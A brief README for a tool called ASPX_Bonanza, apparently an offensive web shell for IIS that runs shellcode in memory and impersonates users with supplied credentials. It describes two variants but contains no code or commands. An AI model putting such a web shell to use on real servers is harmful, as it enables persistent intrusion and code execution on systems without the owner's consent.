# ASPX_Bonanza

ASPX_Bonanza is a multi-featured aspx shell with a unique use case. It has a few features with capabilities such as the use of executing shellcode in memory. Also, this script logs in directly with the impersonating user credentials and doesnâ€™t require the seImpersonate privilege for the user running IIS.

`impersonate_bonanza.aspx` requires valid credentials to get the token and impersonate the user.
`bonanza.aspx` does not require credentials and will run as the current user without impersonating.
